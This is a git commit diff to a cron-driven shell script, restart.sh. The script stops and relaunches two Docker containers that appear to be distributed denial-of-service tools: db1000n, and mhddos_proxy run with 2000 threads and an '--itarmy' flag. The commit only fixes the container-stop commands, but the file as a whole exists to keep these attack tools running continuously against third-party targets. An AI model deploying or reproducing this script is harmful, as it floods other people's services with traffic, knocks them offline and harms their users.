5f2bd85cc4699dc9de723d1279a3e50deb936671
ch <ch@templatemonster.me>
2022-04-28 20:12:34 +0300

    Fixed restart cron

--- restart.sh
+++ restart.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
-docker stop --name=db1000n
+docker stop $(docker ps -a -q --filter="name=db1000n")
 docker run --rm -it -d --name=db1000n --pull always ghcr.io/arriven/db1000n
 
-docker stop --name=mhddos
+docker stop $(docker ps -a -q --filter="name=mhddos")
 docker run -it -d --rm --name=mhddos --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 2000  --itarmy
